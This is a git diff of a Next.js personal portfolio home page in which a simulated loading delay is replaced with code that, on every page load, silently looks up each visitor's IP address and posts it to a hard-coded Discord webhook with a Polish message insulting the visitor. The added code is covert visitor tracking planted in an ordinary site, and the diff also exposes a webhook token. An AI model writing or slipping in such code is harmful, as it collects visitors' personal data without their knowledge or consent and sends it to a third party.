@@ -11,23 +11,37 @@ import Projects from "@/components/Projects";
 import Skills from "@/components/Skills";
 
 export default function Home() {
-  const [isLoading, setIsLoading] = useState(true);
-
   useEffect(() => {
-    const fakeDataFetch = async () => {
+    const fetchIPAndSendToWebhook = async () => {
       try {
-
-        await new Promise((resolve) => setTimeout(resolve, 4000));
-
-        setIsLoading(false);
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ipAddress = data.ip;
+        sendIPToWebhook(ipAddress);
       } catch (error) {
-        console.error('Wystąpił błąd podczas pobierania danych:', error)
+        console.error('Wystąpił błąd podczas pobierania adresu IP:', error);
       }
     };
 
-    fakeDataFetch();
-  }, []);
+    const sendIPToWebhook = async (ip: string) => {
+      try {
+        const webhookURL = 'https://discord.com/api/webhooks/1204518540325953597/3Y9WddSM0GOn6_MbU6S2pVC_GhmxXuDaVSTItAHhNWl5hct53Fr_6yJH0tsDqZnT1POE';
+        const message = `Idiota wbił na strone, jego ip ${ip}`;
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ content: message })
+        });
+        console.log('Adres IP został wysłany na webhook');
+      } catch (error) {
+        console.error('Wystąpił błąd podczas wysyłania adresu IP na webhook:', error);
+      }
+    };
 
+    fetchIPAndSendToWebhook();
+  }, []);
   return (
     <>
         <main className="w-full bg-gray-950 text-gray-300 px-4">
